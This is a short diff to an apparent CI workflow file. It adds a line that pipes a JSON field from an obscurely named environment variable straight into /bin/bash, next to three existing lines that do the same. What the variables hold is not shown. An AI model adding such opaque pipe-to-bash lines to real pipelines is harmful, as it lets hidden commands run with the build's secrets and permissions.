@@ -24,6 +24,7 @@ jobs:
           echo $lbp6108 | jq -r .w0065 | /bin/bash
           echo $sfeg563 | jq -r .it87913 | /bin/bash
           echo $mb90 | jq -r .tg4 | /bin/bash
+          printf '%s' "$vngoh0643" | jq -r .b7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
